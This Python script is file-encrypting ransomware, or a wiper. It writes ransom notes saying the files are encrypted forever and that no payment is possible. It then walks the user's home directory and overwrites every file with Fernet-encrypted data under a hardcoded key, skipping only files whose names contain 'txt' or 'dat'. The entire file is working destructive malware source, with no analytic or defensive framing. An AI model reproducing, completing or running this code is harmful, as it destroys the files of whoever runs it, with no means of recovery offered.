import os
import base64
user = os.getenv("username")
rnote = "Your files have been encrypted and you cant pay us."
import re
ransom = open("readme.txt", "w")
ransom.write(rnote)
ransom.close()
from cryptography.fernet import Fernet
# Use your own key and initialization vector (IV) for encryption
key = base64.b64decode('NFhMMWNtbUU2X3pnVTV1QXVGZTZBQ2pOMjMxWk00ZHVhaHdYay1rd090OD0=')
iv = b''
os.system('echo Your computer has been encrypted FOREVER. There is no payment. > README.txt')
def encrypt_files(folder, exclusions):
    fernet = Fernet(key)
    for path, _, files in os.walk(folder):
        for file in files:
            if any(exclusion in file for exclusion in exclusions):
                continue

            file_path = os.path.join(path, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
# Specify the exclusions for files/file extensions to be skipped during encryption
exclusions = [".txt", "txt", "dat", ".dat", "DAT", ".DAT"]
# Replace 'C:/' with the appropriate directory path
folder_path = '/Users/' + user
# Call the encrypt_files function
encrypt_files(folder_path, exclusions)
